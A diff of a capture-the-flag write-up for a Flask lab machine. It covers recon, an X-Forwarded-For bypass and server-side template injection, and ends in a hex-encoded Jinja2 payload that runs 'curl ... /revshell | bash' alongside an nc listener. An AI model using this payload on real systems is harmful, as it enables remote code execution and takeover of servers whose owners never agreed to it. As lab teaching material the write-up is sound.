@@ -29,7 +29,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.35 second
 
 It looks like we're attacking a Linux machine, running Ubuntu. Nmap found only 1 port open, and seems to have found an interesting hidden entry, specified in `/robots.txt`. We'll verify this in a minute, but first let's have a look at the root directory for this website:
  
-// TODO IMG
+![flaskit_website](https://user-images.githubusercontent.com/58345798/210207658-1f9c70b4-83a0-433f-9237-929020f742b0.png)
 
 Hmm, nothing interesting here: just a static website with a bunch of images and some text, something about bottles, gourds, and more or less flasks. Now, that plus the fact that you probably saw the "flask" tag linked to the THM room : all of this makes us say that this website is probably made with Flask, a python micro framework for web development. For those aleady familiar with this micro framework, you should know Flask is a WSGI application (or *Web Server Gateway Interface*, [see more here](https://en.wikipedia.org/wiki/Web_Server_Gateway_Interfacehttps://en.wikipedia.org/wiki/Web_Server_Gateway_Interface)). This means in order to run a flask application, we'll need a A WSGI server, which will convert incoming HTTP requests to the standard WSGI environ, and convert outgoing WSGI responses to HTTP responses. Now, it is important to know this before continuing, because here we can see the website is served from an Nginx server. This is most likely to be a reverse proxy architecture, where our HTTP server is placed in front of the WSGI server. Understanding this will may be helpful for the rest of the challenge... :)
 
@@ -110,7 +110,7 @@ $ curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.56.80/2e51aab2-8824-47a6-9
 The value of the `command` param is reflecting on the page! Let's see if it's vulnerable to SSTI (Server-Side Template Injection). Still assuming our website is running with Flask, the syntax of a basic injection would look like this : `{{6*7}}`, this would execute and render `42` in the HTML template. 
 > Here I'll use Postman for the example, as it is one simple way to specify the `X-forwarded-For` header, but using burpsuite, your browser's developer tools or any other tool would perfectly work too for this kind of job. You could also continue using curl, but don't forget to escape special chars, or to manually encode your command, as it only accepts URL encoding format.
 
-// TODO IMG postman
+![postman](https://user-images.githubusercontent.com/58345798/210207689-0f038a01-3c0e-4ad8-a504-d61ba062d680.png)
 
 Bingo ! Our speculations about the Flask app turned out to be true, moreover the application is vulnerable to SSTI !
 
@@ -135,9 +135,9 @@ $ nc -lnvp 4000
 Listening on 0.0.0.0 4000
 ```
 4. Set the `?command=` value to your payload, and send the request:
-```
-// TODO IMG POSTMAN 2
-```  
+![Postman2](https://user-images.githubusercontent.com/58345798/210207722-be172d1d-03fd-4ed5-8569-4dca22832036.png)
+
+
 Looks like we'll have to search a bit more, to find an exploit that bypasses this specific filter. One way to do it is modifying our first payload using Jinja2's `attr()` filter, accepting hex encoded format.
 Our final payload looks like this :
 `{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 192.168.56.1:8000/revshell | bash")|attr("read")()}}`
